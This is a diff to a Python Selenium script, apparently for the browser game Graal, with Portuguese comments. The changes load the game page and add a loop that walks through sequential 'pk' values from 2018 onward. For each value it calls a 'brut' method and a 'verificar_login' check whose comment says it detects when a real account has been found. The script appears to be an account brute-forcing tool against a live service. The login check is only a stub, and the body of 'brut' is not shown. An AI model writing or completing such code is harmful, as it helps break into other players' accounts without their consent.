@@ -29,6 +29,8 @@ class Graal:
         Para abrir página do jogo pela primeira vez
         """
         self.driver.get(self.link_jogo)
+        WebDriverWait(self.driver, 300).until(EC.presence_of_element_located((By.ID, 'unity-canvas')))
+        self.driver.execute_script("console.log('apareceu')")        
 
     def apertar_enter(self):
         """
@@ -52,8 +54,16 @@ class Graal:
             new_pk[1] = str(new_pk[1])[1:]
             new_pk[0] = str(int(new_pk[0]) + 1)
         result = f"{new_pk[0]}.{new_pk[1]}"
-        print(result)
         return result
+
+    def filtros(self, pk):
+        # Se tiver filtros, colocar aqui. Return False para não testar a pk atual
+        return True
+
+
+    def verificar_login(self, pk):
+        # Verifica se foi encontrado uma conta real
+        ...
 
     def brut(self, pk:str):
         """
@@ -71,12 +81,16 @@ class Graal:
         PK/Contador inicial está no primeiro dia de 2018
         @param operation = 'somar' ou 'subtrair'
         """
+        self.abrir_jogo()
+
         pk = pk_inicial
 
         while self.runLoop == True:
 
-            
-            pk = self.pk_operation(pk, 100, 'somar') #  Deixar sempre no fim do loop
+            if self.filtros(pk) == True:
+                self.brut(pk)
+                self.verificar_login(pk)
+            pk = self.pk_operation(pk, 1, 'somar') #  Deixar sempre no fim do loop
    
 
 
